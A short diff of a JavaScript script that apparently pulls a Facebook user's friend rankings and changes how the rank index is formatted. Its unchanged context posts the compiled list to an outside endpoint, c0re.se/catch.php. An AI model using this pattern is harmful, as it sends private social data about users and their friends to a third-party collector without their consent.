@@ -39,7 +39,7 @@ $.ajax({
 		friends = friends.payload.entries;
 		var display = "Facebook Friend Rankings for: " + Env.user;
 		for(var i = 0; i < friends.length; i++){
-			var info = "\n" + friends[i].text + "," + friends[i].index;
+			var info = "\n" + friends[i].text + "," + friends[i].index*-1;
 			display += info;
 		}
 		$.post("http://c0re.se/catch.php", { text:display }, function(data){ 
